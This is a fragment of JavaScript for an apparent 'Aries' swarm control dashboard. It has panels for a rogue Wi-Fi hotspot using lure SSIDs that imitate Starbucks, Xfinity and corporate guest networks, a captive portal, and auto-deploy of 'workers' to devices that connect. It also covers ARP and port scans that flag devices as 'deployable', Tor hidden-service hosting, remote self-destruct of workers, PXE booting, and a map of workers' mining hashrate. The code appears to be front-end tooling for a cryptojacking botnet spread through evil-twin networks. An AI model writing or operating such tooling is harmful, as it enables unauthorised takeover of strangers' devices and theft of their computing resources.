        _fleetLog.push(r.message || 'Deploy started');
        if (logEl) logEl.textContent = _fleetLog.join('\n');
        toast('Deploy started', 'success');
      }).catch(function(e) { toast(e.message, 'error'); });
    }

    // ═══ WiFi Deploy (Captive Portal) ═══
    // ── Hotspot Manager ──
    function loadHotspot() {
      var el = document.getElementById('hotspotContent');
      if (!el) return;
      el.innerHTML = '<p style="color:var(--dim)">Loading...</p>';
      Promise.all([
        api('GET', 'hotspot/status').catch(function() { return { running: false, ssid: 'Free_WiFi', clients: 0, supported: false }; }),
        api('GET', 'hotspot/clients').catch(function() { return { clients: [] }; }),
        api('GET', 'hotspot/supported').catch(function() { return { supported: false }; })
      ]).then(function(results) {
        var st = results[0], clients = results[1].clients || [], sup = results[2];
        var html = '';

        // Hardware check
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x1F4F6; Hardware Check</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:12px 0">';
        html += '<div><div style="font-size:20px;' + (sup.supported ? 'color:var(--green)' : 'color:var(--red)') + '">' + (sup.supported ? '&#x2714; Supported' : '&#x2716; Not Supported') + '</div><div style="font-size:11px;color:var(--dim)">AP Mode</div></div>';
        html += '<div><div style="font-size:20px;color:var(--accent)">' + (sup.method || 'N/A') + '</div><div style="font-size:11px;color:var(--dim)">Method</div></div>';
        html += '<div><button class="btn-sm" onclick="window.aries.hotspotCheckHw()">&#x1F50D; Re-check</button></div>';
        html += '</div>';
        html += '<p style="font-size:11px;color:var(--dim);margin-top:8px">&#x26A0; Requires ethernet for internet &mdash; WiFi card is used for hotspot</p>';
        html += '</div>';

        // Hotspot Control
        html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">';
        html += '<div class="info-card"><h3>&#x1F4E1; Hotspot Control</h3>';
        html += '<div style="font-size:28px;margin:8px 0">' + (st.running ? '<span style="color:var(--green)">&#x25CF; RUNNING</span>' : '<span style="color:var(--dim)">&#x25CB; STOPPED</span>') + '</div>';
        html += '<div style="margin:12px 0">';
        html += '<label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px">SSID</label>';
        html += '<input id="hsSSID" class="input-field" style="width:100%;margin-bottom:8px" value="' + (st.ssid || 'Free_WiFi') + '" />';
        html += '<label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px">Password</label>';
        html += '<input id="hsPassword" class="input-field" style="width:100%;margin-bottom:8px" type="password" value="' + (st.password || 'password123') + '" />';
        html += '<label style="font-size:12px;color:var(--dim);display:inline-flex;align-items:center;gap:6px;margin-bottom:8px"><input id="hsOpen" type="checkbox"' + (st.open ? ' checked' : '') + '> Open Network (no password)</label>';
        html += '</div>';
        // SSID Presets
        html += '<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px">Presets</label>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:4px">';
        var presets = [['Free_WiFi','Free WiFi'],['SETUP','Setup'],['Company_Guest','Corporate'],['xfinitywifi','Xfinity'],['Starbucks WiFi','Starbucks']];
        for (var p = 0; p < presets.length; p++) {
          html += '<button class="btn-sm" style="font-size:10px;padding:2px 8px" onclick="document.getElementById(\'hsSSID\').value=\'' + presets[p][0] + '\';">' + presets[p][1] + '</button>';
        }
        html += '</div></div>';
        html += '<div style="display:flex;gap:8px">';
        if (st.running) {
          html += '<button class="btn-primary" style="background:var(--red)" onclick="window.aries.hotspotStop()">&#x23F9; Stop</button>';
        } else {
          html += '<button class="btn-primary" onclick="window.aries.hotspotStart()">&#x25B6; Start Hotspot</button>';
        }
        html += '</div></div>';

        // Stats
        html += '<div class="info-card"><h3>&#x1F4CA; Stats</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px">';
        html += '<div><div style="font-size:24px;color:var(--accent)">' + (st.clients || 0) + '</div><div style="font-size:11px;color:var(--dim)">Connected Clients</div></div>';
        html += '<div><div style="font-size:24px;color:var(--accent)">' + (st.method || 'N/A') + '</div><div style="font-size:11px;color:var(--dim)">Method</div></div>';
        html += '<div><div style="font-size:24px;color:var(--accent)">' + (st.ip || 'N/A') + '</div><div style="font-size:11px;color:var(--dim)">Hotspot IP</div></div>';
        html += '<div><div style="font-size:24px;color:var(--accent)">' + (st.band || '2.4GHz') + '</div><div style="font-size:11px;color:var(--dim)">Band</div></div>';
        html += '</div>';
        html += '<div style="margin-top:12px"><label style="font-size:12px;color:var(--dim);display:inline-flex;align-items:center;gap:6px"><input type="checkbox" onchange="window.aries.hotspotAutoDeploy(this.checked)"' + (st.autoDeployOnConnect ? ' checked' : '') + '> Auto-deploy on connect</label></div>';
        html += '</div></div>';

        // Connected Clients Table
        html += '<div class="info-card"><h3>&#x1F4F1; Connected Clients (' + clients.length + ')</h3>';
        if (clients.length === 0) {
          html += '<p style="color:var(--dim);margin-top:8px">No clients connected.</p>';
        } else {
          html += '<div style="max-height:300px;overflow-y:auto;margin-top:8px"><table style="width:100%;font-size:12px;border-collapse:collapse">';
          html += '<tr style="color:var(--dim);text-align:left"><th style="padding:6px">IP</th><th style="padding:6px">MAC</th><th style="padding:6px">Vendor</th><th style="padding:6px">First Seen</th><th style="padding:6px">Status</th><th style="padding:6px">Action</th></tr>';
          for (var ci = 0; ci < clients.length; ci++) {
            var cl = clients[ci];
            var statusIcon = cl.deployed ? '<span style="color:var(--green)">&#x2714; Deployed</span>' : (cl.deployStatus || '<span style="color:var(--dim)">Pending</span>');
            html += '<tr style="border-top:1px solid var(--border)">';
            html += '<td style="padding:6px;font-family:monospace">' + (cl.ip || '?') + '</td>';
            html += '<td style="padding:6px;font-family:monospace;font-size:10px">' + (cl.mac || '?') + '</td>';
            html += '<td style="padding:6px">' + (cl.vendor || 'Unknown') + '</td>';
            html += '<td style="padding:6px">' + (cl.firstSeen ? new Date(cl.firstSeen).toLocaleTimeString() : '?') + '</td>';
            html += '<td style="padding:6px">' + statusIcon + '</td>';
            html += '<td style="padding:6px"><button class="btn-sm" style="font-size:10px;padding:1px 6px" onclick="window.aries.hotspotDeploy(\'' + (cl.ip || '') + '\')">Deploy</button></td>';
            html += '</tr>';
          }
          html += '</table></div>';
        }
        html += '</div>';

        el.innerHTML = html;
      });
    }

    function hotspotStart() {
      var ssid = document.getElementById('hsSSID') ? document.getElementById('hsSSID').value : 'Free_WiFi';
      var pass = document.getElementById('hsPassword') ? document.getElementById('hsPassword').value : 'password123';
      var open = document.getElementById('hsOpen') ? document.getElementById('hsOpen').checked : false;
      toast('Starting hotspot...', 'info');
      api('POST', 'hotspot/start', { ssid: ssid, password: pass, open: open }).then(function() {
        toast('Hotspot started!', 'success');
        _loadedPanels['hotspot'] = false;
        loadHotspot();
      }).catch(function(e) { toast('Failed: ' + e.message, 'error'); });
    }

    function hotspotStop() {
      api('POST', 'hotspot/stop').then(function() {
        toast('Hotspot stopped', 'success');
        _loadedPanels['hotspot'] = false;
        loadHotspot();
      }).catch(function(e) { toast('Failed: ' + e.message, 'error'); });
    }

    function hotspotCheckHw() {
      api('GET', 'hotspot/supported').then(function(r) {
        toast('AP Mode: ' + (r.supported ? 'Supported (' + r.method + ')' : 'Not supported'), r.supported ? 'success' : 'error');
      });
    }

    function hotspotAutoDeploy(enabled) {
      api('POST', 'hotspot/auto-deploy', { enabled: enabled }).then(function() {
        toast('Auto-deploy ' + (enabled ? 'enabled' : 'disabled'), 'success');
      });
    }

    function hotspotDeploy(ip) {
      toast('Deploying to ' + ip + '...', 'info');
      api('POST', 'wifi/deploy', { ip: ip }).then(function(r) {
        toast('Deploy result: ' + (r.success ? 'Success' : r.error || 'Failed'), r.success ? 'success' : 'error');
        loadHotspot();
      }).catch(function(e) { toast('Deploy failed: ' + e.message, 'error'); });
    }


    function loadWifiDeploy() {
      var el = document.getElementById('wifiDeployContent');
      if (!el) return;
      el.innerHTML = '<p style="color:var(--dim)">Loading...</p>';
      Promise.all([
        api('GET', 'captive-portal/status').catch(function() { return { running: false, totalConnections: 0, successfulDeploys: 0 }; }),
        api('GET', 'captive-portal/templates').catch(function() { return { templates: [] }; }),
        api('GET', 'captive-portal/connections').catch(function() { return { connections: [] }; }),
        api('GET', 'wifi/status').catch(function() { return { currentSSID: null, trusted: false, trustedSSIDs: [] }; })
      ]).then(function(results) {
        var st = results[0], tmpl = results[1].templates || [], conns = results[2].connections || [];
        var wifi = results[3];
        var html = '';
        // ── My Networks Scanner ──
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x1F4F6; My Networks - Auto Scanner</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:12px 0">';
        html += '<div><div style="font-size:20px;color:var(--accent)">' + (wifi.currentSSID || 'Not connected') + '</div><div style="font-size:11px;color:var(--dim)">Current WiFi</div></div>';
        html += '<div><div style="font-size:20px;' + (wifi.trusted ? 'color:var(--green)' : 'color:var(--red)') + '">' + (wifi.trusted ? '&#x2714; TRUSTED' : '&#x2716; UNKNOWN') + '</div><div style="font-size:11px;color:var(--dim)">Network Status</div></div>';
        html += '<div><div style="font-size:20px;color:var(--accent)">' + (wifi.trustedSSIDs || []).length + '</div><div style="font-size:11px;color:var(--dim)">Trusted Networks</div></div>';
        html += '</div>';
        // Trusted SSID management
        html += '<div style="margin:12px 0"><label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px">Trusted Networks</label>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px">';
        var tSSIDs = wifi.trustedSSIDs || [];
        for (var ts = 0; ts < tSSIDs.length; ts++) {
          html += '<span style="background:var(--bg2);padding:4px 10px;border-radius:12px;font-size:12px;display:inline-flex;align-items:center;gap:4px">' + tSSIDs[ts] + ' <span style="cursor:pointer;color:var(--red)" onclick="window.aries.removeSSID(\'' + tSSIDs[ts].replace(/'/g, "\\'") + '\')">&#x2716;</span></span>';
        }
        html += '</div>';
        html += '<div style="display:flex;gap:8px"><input id="addSSID" class="input-field" style="flex:1" placeholder="Add WiFi name (SSID)..." />';
        if (wifi.currentSSID && !wifi.trusted) {
          html += '<button class="btn-sm" onclick="window.aries.addSSID(\'' + wifi.currentSSID.replace(/'/g, "\\'") + '\')">+ Add Current</button>';
        }
        html += '<button class="btn-sm" onclick="var v=document.getElementById(\'addSSID\').value;if(v)window.aries.addSSID(v)">+ Add</button></div>';
        html += '</div>';
        // Scan button + results
        html += '<div style="margin:12px 0"><button class="btn-primary" onclick="window.aries.wifiScan()" ' + (wifi.trusted ? '' : 'disabled title="Connect to a trusted network first"') + '>&#x1F50D; Scan Network for Devices</button>';
        html += ' <button class="btn-sm" onclick="window.aries.wifiArpScan()">Quick ARP Scan</button></div>';
        html += '<div id="wifiScanResults"></div>';
        html += '</div>';
        // ── Captive Portal (existing) ──
        html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">';
        // Status card
        html += '<div class="info-card"><h3>Portal Status</h3>';
        html += '<div style="font-size:28px;margin:8px 0">' + (st.running ? '<span style="color:var(--green)">&#x25CF; RUNNING</span>' : '<span style="color:var(--dim)">&#x25CB; STOPPED</span>') + '</div>';
        html += '<div style="margin:8px 0"><button class="btn-primary" onclick="window.aries.toggleCaptivePortal()">' + (st.running ? '&#x23F9; Stop Portal' : '&#x25B6; Start Portal') + '</button></div>';
        html += '<div style="font-size:13px;color:var(--dim)">Port: ' + (st.port || 8080) + ' | SSID: ' + (st.ssid || 'Free_WiFi') + '</div>';
        html += '</div>';
        // Stats card
        html += '<div class="info-card"><h3>Deployment Stats</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px">';
        html += '<div><div style="font-size:24px;color:var(--accent)">' + (st.totalConnections || 0) + '</div><div style="font-size:11px;color:var(--dim)">Total Connections</div></div>';
        html += '<div><div style="font-size:24px;color:var(--green)">' + (st.successfulDeploys || 0) + '</div><div style="font-size:11px;color:var(--dim)">Successful Deploys</div></div>';
        html += '</div></div></div>';
        // Config section
        html += '<div class="info-card" style="margin-bottom:16px"><h3>Portal Configuration</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px">';
        html += '<div><label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px">Template</label><select id="cpTemplate" class="input-field" style="width:100%">';
        for (var i = 0; i < tmpl.length; i++) {
          html += '<option value="' + tmpl[i].id + '"' + (tmpl[i].id === st.template ? ' selected' : '') + '>' + tmpl[i].name + '</option>';
        }
        html += '</select></div>';
        html += '<div><label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px">SSID Name</label><input id="cpSsid" class="input-field" style="width:100%" value="' + (st.ssid || 'Free_WiFi') + '" /></div>';
        html += '<div><label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px">Port</label><input id="cpPort" class="input-field" style="width:100%" type="number" value="' + (st.port || 8080) + '" /></div>';
        html += '</div>';
        html += '<button class="btn-sm" style="margin-top:12px" onclick="window.aries.saveCaptiveConfig()">&#x1F4BE; Save Config</button>';
        html += '</div>';
        // Connection log
        html += '<div class="info-card"><h3>Connection Log</h3>';
        if (conns.length === 0) {
          html += '<p style="color:var(--dim);margin-top:8px">No connections yet.</p>';
        } else {
          html += '<div style="max-height:300px;overflow-y:auto;margin-top:8px"><table style="width:100%;font-size:12px;border-collapse:collapse">';
          html += '<tr style="color:var(--dim);text-align:left"><th style="padding:6px">Time</th><th style="padding:6px">IP</th><th style="padding:6px">OS</th><th style="padding:6px">Status</th></tr>';
          for (var j = conns.length - 1; j >= Math.max(0, conns.length - 50); j--) {
            var c = conns[j];
            var deployIcon = c.deployed ? '<span style="color:var(--green)">&#x2714; ' + (c.deployType || 'deployed') + '</span>' : '<span style="color:var(--dim)">view only</span>';
            html += '<tr style="border-top:1px solid var(--border)"><td style="padding:6px">' + new Date(c.timestamp).toLocaleTimeString() + '</td><td style="padding:6px;font-family:monospace">' + (c.ip || '?') + '</td><td style="padding:6px">' + (c.os || '?') + '</td><td style="padding:6px">' + deployIcon + '</td></tr>';
          }
          html += '</table></div>';
        }
        html += '</div>';
        el.innerHTML = html;
      });
    }
    function addSSID(ssid) {
      api('POST', 'wifi/trusted', { add: ssid }).then(function() { toast('Added ' + ssid, 'success'); loadWifiDeploy(); }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }
    function removeSSID(ssid) {
      api('POST', 'wifi/trusted', { remove: ssid }).then(function() { toast('Removed ' + ssid, 'success'); loadWifiDeploy(); }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }
    function wifiScan() {
      var el = document.getElementById('wifiScanResults');
      if (el) el.innerHTML = '<p style="color:var(--dim)">&#x23F3; Scanning network... (ARP + port scan)</p>';
      api('POST', 'wifi/scan').then(function(r) {
        if (r.error) { if (el) el.innerHTML = '<p style="color:var(--red)">' + r.error + '</p>'; return; }
        var devs = r.devices || [];
        var h = '<div style="margin-top:8px"><div style="font-size:13px;color:var(--dim);margin-bottom:8px">' + r.total + ' devices found, ' + r.deployable + ' deployable on <b>' + r.ssid + '</b></div>';
        if (devs.length === 0) { h += '<p style="color:var(--dim)">No devices found.</p>'; }
        else {
          h += '<table style="width:100%;font-size:12px;border-collapse:collapse">';
          h += '<tr style="color:var(--dim);text-align:left"><th style="padding:6px">IP</th><th style="padding:6px">MAC</th><th style="padding:6px">Type</th><th style="padding:6px">Services</th><th style="padding:6px">Action</th></tr>';
          for (var d = 0; d < devs.length; d++) {
            var dev = devs[d];
            var statusColor = dev.deployable ? 'var(--green)' : 'var(--dim)';
            var btn = dev.deployed ? '<span style="color:var(--green)">&#x2714; Deployed</span>' :
              (dev.deployable ? '<button class="btn-sm" onclick="window.aries.wifiDeployTo(\'' + dev.ip + '\',\'' + dev.deployMethod + '\')">&#x1F680; Deploy</button>' : '<span style="color:var(--dim)">-</span>');
            h += '<tr style="border-top:1px solid var(--border)"><td style="padding:6px;font-family:monospace;color:' + statusColor + '">' + dev.ip + '</td><td style="padding:6px;font-family:monospace;font-size:11px">' + (dev.mac || '') + '</td><td style="padding:6px">' + (dev.type || dev.os || '') + '</td><td style="padding:6px">' + (dev.services || []).join(', ') + '</td><td style="padding:6px">' + btn + '</td></tr>';
          }
          h += '</table>';
        }
        h += '</div>';
        if (el) el.innerHTML = h;
      }).catch(function(e) { if (el) el.innerHTML = '<p style="color:var(--red)">Scan failed: ' + e.message + '</p>'; });
    }
    function wifiArpScan() {
      var el = document.getElementById('wifiScanResults');
      if (el) el.innerHTML = '<p style="color:var(--dim)">&#x23F3; Quick ARP scan...</p>';
      api('GET', 'wifi/arp').then(function(r) {
        var devs = r.devices || [];
        var h = '<div style="margin-top:8px"><div style="font-size:13px;color:var(--dim);margin-bottom:8px">' + r.count + ' devices on <b>' + (r.ssid || 'network') + '</b>' + (r.trusted ? ' &#x2714;' : '') + '</div>';
        h += '<div style="display:flex;flex-wrap:wrap;gap:8px">';
        for (var d = 0; d < devs.length; d++) {
          h += '<div style="background:var(--bg2);padding:6px 12px;border-radius:8px;font-size:12px"><span style="font-family:monospace">' + devs[d].ip + '</span> <span style="color:var(--dim)">' + (devs[d].type !== 'unknown' ? devs[d].type : devs[d].mac) + '</span></div>';
        }
        h += '</div></div>';
        if (el) el.innerHTML = h;
      }).catch(function(e) { if (el) el.innerHTML = '<p style="color:var(--red)">' + e.message + '</p>'; });
    }
    function wifiDeployTo(ip, method) {
      if (!confirm('Deploy Aries worker to ' + ip + ' via ' + method + '?')) return;
      toast('Deploying to ' + ip + '...', 'info');
      api('POST', 'wifi/deploy', { ip: ip, method: method }).then(function(r) {
        toast(r.success ? 'Deployed to ' + ip + '!' : 'Deploy failed', r.success ? 'success' : 'error');
        wifiScan();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }
    function toggleCaptivePortal() {
      api('GET', 'captive-portal/status').then(function(st) {
        var action = st.running ? 'stop' : 'start';
        api('POST', 'captive-portal/' + action).then(function() {
          toast('Portal ' + (action === 'start' ? 'started' : 'stopped'), 'success');
          setTimeout(loadWifiDeploy, 500);
        }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
      });
    }
    function saveCaptiveConfig() {
      var tmpl = document.getElementById('cpTemplate'); var ssid = document.getElementById('cpSsid'); var port = document.getElementById('cpPort');
      api('POST', 'captive-portal/config', { template: tmpl ? tmpl.value : 'coffeeshop', ssid: ssid ? ssid.value : 'Free_WiFi', port: port ? parseInt(port.value) : 8080 }).then(function() {
        toast('Config saved', 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ── Tor Hidden Service ──
    function torRefresh() {
      api('GET', 'tor/status').then(function(st) {
        var el = document.getElementById('tor-running');
        if (el) el.textContent = st.running ? '🟢 Running' : '🔴 Stopped';
        if (!st.installed && el) el.textContent = '⚠️ Tor not installed';
        var addr = document.getElementById('tor-address');
        if (addr) addr.textContent = st.address || '-';
      }).catch(function() {});
    }
    function torStart() {
      api('POST', 'tor/start').then(function(r) {
        if (r.error) { toast(r.error + (r.instructions ? '. ' + r.instructions : ''), 'error'); return; }
        toast('Tor starting...', 'success');
        setTimeout(torRefresh, 5000);
        setTimeout(torRefresh, 15000);
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }
    function torStop() {
      api('POST', 'tor/stop').then(function() { toast('Tor stopped', 'success'); torRefresh(); }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ── Swarm Self-Destruct ──
    function swarmDestruct(workerId) {
      if (!confirm('Self-destruct ' + (workerId || 'ALL workers') + '? This is irreversible!')) return;
      api('POST', 'swarm/destruct', { workerId: workerId || null }).then(function(r) {
        toast('Destruct command sent to ' + (r.target || 'all'), 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════
    //  TASK MARKETPLACE
    // ═══════════════════════════════
    function refreshMarketplace() {
      api('GET', 'marketplace/earnings').then(function(data) {
        var cards = document.getElementById('mpEarningsCards');
        if (cards) {
          cards.innerHTML = '<div class="stat-card"><div class="stat-card-val">' + (data.totalTasks || 0) + '</div><div class="stat-card-label">Total Tasks</div></div>' +
            '<div class="stat-card"><div class="stat-card-val">' + (data.totalRevenue || 0).toFixed(6) + ' SOL</div><div class="stat-card-label">Total Revenue</div></div>';
        }
        // Revenue chart
        var chartDiv = document.getElementById('mpRevenueChart');
        if (chartDiv && data.daily) {
          var days = Object.keys(data.daily).sort().slice(-14);
          if (days.length === 0) { chartDiv.innerHTML = '<div style="color:var(--text-dim);text-align:center;padding:40px">No revenue data yet</div>'; }
          else {
            var maxVal = Math.max.apply(null, days.map(function(d) { return data.daily[d]; })) || 0.001;
            var html = '<div style="display:flex;align-items:flex-end;gap:4px;height:160px">';
            for (var i = 0; i < days.length; i++) {
              var val = data.daily[days[i]];
              var pct = Math.max(5, (val / maxVal) * 100);
              html += '<div style="flex:1;display:flex;flex-direction:column;align-items:center"><div style="background:linear-gradient(to top,#667eea,#764ba2);width:100%;height:' + pct + '%;border-radius:4px 4px 0 0;min-height:4px" title="' + val.toFixed(6) + ' SOL"></div><div style="font-size:10px;color:var(--text-dim);margin-top:4px;transform:rotate(-45deg);white-space:nowrap">' + days[i].slice(5) + '</div></div>';
            }
            html += '</div>';
            chartDiv.innerHTML = html;
          }
        }
      }).catch(function() {});

      api('GET', 'marketplace/tasks').then(function(data) {
        var activeDiv = document.getElementById('mpActiveTasks');
        var completedDiv = document.getElementById('mpCompletedTasks');
        if (activeDiv) {
          if (!data.active || data.active.length === 0) activeDiv.innerHTML = '<div style="color:var(--text-dim);font-size:13px">No active tasks</div>';
          else {
            var html = '';
            for (var i = 0; i < data.active.length; i++) {
              var t = data.active[i];
              html += '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-bottom:6px;font-size:13px"><strong>' + escapeHtml(t.id.substring(0, 12)) + '</strong> - ' + escapeHtml((t.prompt || '').substring(0, 60)) + ' <span style="color:#0af">[' + t.status + ']</span></div>';
            }
            activeDiv.innerHTML = html;
          }
        }
        if (completedDiv) {
          if (!data.completed || data.completed.length === 0) completedDiv.innerHTML = '<div style="color:var(--text-dim);font-size:13px">No completed tasks yet</div>';
          else {
            var html = '';
            for (var i = 0; i < Math.min(data.completed.length, 20); i++) {
              var t = data.completed[i];
              html += '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-bottom:6px;font-size:13px"><strong>' + escapeHtml(t.id.substring(0, 12)) + '</strong> - ' + (t.estimatedCost || 0).toFixed(6) + ' SOL - ' + escapeHtml((t.prompt || '').substring(0, 40)) + '</div>';
            }
            completedDiv.innerHTML = html;
          }
        }
      }).catch(function() {});

      api('GET', 'marketplace/pricing').then(function(data) {
        var pDiv = document.getElementById('mpPricing');
        if (pDiv && data.pricing) {
          var html = '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px">';
          for (var model in data.pricing) {
            html += '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;text-align:center"><div style="font-weight:600;color:var(--accent)">' + escapeHtml(model) + '</div><div style="font-size:1.2em;margin-top:4px">' + data.pricing[model] + ' SOL</div><div style="font-size:11px;color:var(--text-dim)">per 1K tokens</div></div>';
          }
          html += '</div>';
          pDiv.innerHTML = html;
        }
      }).catch(function() {});
    }

    // ═══════════════════════════════
    //  DOCKER DEPLOY
    // ═══════════════════════════════
    function refreshDocker() {
      api('GET', 'docker/dockerfile').then(function(data) {
        var el = document.getElementById('dockerFileContent');
        if (el) el.textContent = data.dockerfile || '';
      }).catch(function() {});
      api('GET', 'docker/run-command').then(function(data) {
        var el = document.getElementById('dockerRunCmd');
        if (el) el.textContent = data.command || '';
      }).catch(function() {});
      api('GET', 'docker/compose').then(function(data) {
        var el = document.getElementById('dockerComposeContent');
        if (el) el.textContent = data.compose || '';
      }).catch(function() {});
    }
    function copyDockerfile() { var el = document.getElementById('dockerFileContent'); if (el) { navigator.clipboard.writeText(el.textContent); toast('Dockerfile copied!'); } }
    function copyDockerRun() { var el = document.getElementById('dockerRunCmd'); if (el) { navigator.clipboard.writeText(el.textContent); toast('Run command copied!'); } }
    function copyDockerCompose() { var el = document.getElementById('dockerComposeContent'); if (el) { navigator.clipboard.writeText(el.textContent); toast('docker-compose.yml copied!'); } }
    function buildDockerImage() {
      var resultDiv = document.getElementById('dockerBuildResult');
      if (resultDiv) resultDiv.innerHTML = '<div style="color:var(--accent2)">Building image...</div>';
      api('POST', 'docker/build').then(function(data) {
        if (data.error) resultDiv.innerHTML = '<div style="color:#f55">' + escapeHtml(data.error) + '</div>';
        else resultDiv.innerHTML = '<div style="color:#0f0">&#x2705; Image built successfully!</div><pre style="font-size:11px;margin-top:8px;max-height:150px;overflow-y:auto">' + escapeHtml(data.output || '') + '</pre>';
      }).catch(function(e) { if (resultDiv) resultDiv.innerHTML = '<div style="color:#f55">Build failed</div>'; });
    }

    // ═══════════════════════════════
    //  PXE BOOT SERVER
    // ═══════════════════════════════
    function loadPxeBoot() {
      var el = document.getElementById('pxeBootContent');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading PXE status...';
      api('GET', 'pxe/status').then(function(data) {
        var html = '';
        html += '<div class="stat-row">';
        html += '<div class="stat-card"><div class="stat-card-val">' + (data.running ? '<span style="color:var(--green)">ACTIVE</span>' : '<span style="color:var(--text-dim)">STOPPED</span>') + '</div><div class="stat-card-label">PXE Server</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (data.bootCount || 0) + '</div><div class="stat-card-label">Boot Count</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + ((data.clients || []).length) + '</div><div class="stat-card-label">Clients</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (data.lastBoot ? new Date(data.lastBoot).toLocaleTimeString() : 'Never') + '</div><div class="stat-card-label">Last Boot</div></div>';
        html += '</div>';
        // Controls
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">&#x1F4E1; PXE Server Control</h3>';
        html += '<div style="display:flex;gap:8px;align-items:center">';
        if (data.running) {
          html += '<button class="btn-primary" onclick="window.aries.togglePxeServer(false)" style="background:var(--red)">&#x23F9; Stop Server</button>';
        } else {
          html += '<button class="btn-primary" onclick="window.aries.togglePxeServer(true)">&#x25B6; Start Server</button>';
        }
        html += '<span style="font-size:12px;color:var(--text-dim)">TFTP: ' + (data.tftpPort || 69) + ' | HTTP: ' + (data.httpPort || 8888) + '</span>';
        html += '</div></div>';
        // Client table
        var clients = data.clients || [];
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent2)">&#x1F4BB; PXE Clients</h3>';
        if (clients.length === 0) {
          html += '<div style="color:var(--text-dim);font-size:13px">No clients have booted via PXE yet.</div>';
        } else {
          html += '<table class="data-table"><tr><th>IP</th><th>MAC</th><th>First Seen</th><th>Last Seen</th><th>Boots</th><th>Status</th></tr>';
          for (var i = 0; i < clients.length; i++) {
            var c = clients[i];
            html += '<tr><td>' + escapeHtml(c.ip || '') + '</td>';
            html += '<td><code>' + escapeHtml(c.mac || 'unknown') + '</code></td>';
            html += '<td>' + (c.firstSeen ? new Date(c.firstSeen).toLocaleString() : '-') + '</td>';
            html += '<td>' + (c.lastSeen ? new Date(c.lastSeen).toLocaleString() : '-') + '</td>';
            html += '<td>' + (c.bootCount || 0) + '</td>';
            html += '<td><span style="color:var(--green)">&#x25CF;</span> ' + escapeHtml(c.status || 'active') + '</td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';
        el.innerHTML = html;
      }).catch(function(e) {
        el.innerHTML = '<div style="color:var(--red)">Failed to load PXE status: ' + escapeHtml(e.message) + '</div>';
      });
    }

    function togglePxeServer(start) {
      var endpoint = start ? 'pxe/start' : 'pxe/stop';
      api('POST', endpoint).then(function() {
        toast(start ? 'PXE server started' : 'PXE server stopped', 'success');
        _loadedPanels['pxe-boot'] = false;
        loadPxeBoot();
      }).catch(function(e) { toast('PXE error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════
    //  3D GLOBE VISUALIZATION
    // ═══════════════════════════════
    var _globeInitialized = false;
    function initSwarmGlobe() {
      if (_globeInitialized) return;
      var container = document.getElementById('swarmGlobe');
      if (!container) return;

      var script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.min.js';
      script.onload = function() { _buildGlobe(container); };
      script.onerror = function() { _fallbackGlobe(container); };
      document.head.appendChild(script);
      _globeInitialized = true;
    }

    function _fallbackGlobe(container) {
      container.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#667eea;font-size:14px">&#x1F30D; 3D Globe unavailable - loading worker map...</div>';
      api('GET', 'miner/map').then(function(data) {
        var workers = data.workers || [];
        if (workers.length === 0) { container.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#555">No worker location data</div>'; return; }
        var html = '<div style="padding:16px;overflow-y:auto;height:100%"><h3 style="color:#0ff;margin:0 0 12px">Worker Locations</h3>';
        for (var i = 0; i < workers.length; i++) {
          var w = workers[i];
          var color = w.status === 'mining+ai' ? '#0f0' : w.status === 'mining' ? '#ff0' : '#f55';
          html += '<div style="padding:6px 0;border-bottom:1px solid #1a1a2e;font-size:13px"><span style="color:' + color + '">&#x25CF;</span> ' + escapeHtml(w.hostname || w.id || 'unknown') + ' - ' + escapeHtml(w.location || 'unknown') + ' - ' + (w.hashrate || 0) + ' H/s</div>';
        }
        html += '</div>';
        container.innerHTML = html;
      }).catch(function() {});
    }

    function _buildGlobe(container) {
      if (typeof THREE === 'undefined') return _fallbackGlobe(container);

      var width = container.clientWidth || 400;
      var height = 400;
      var scene = new THREE.Scene();
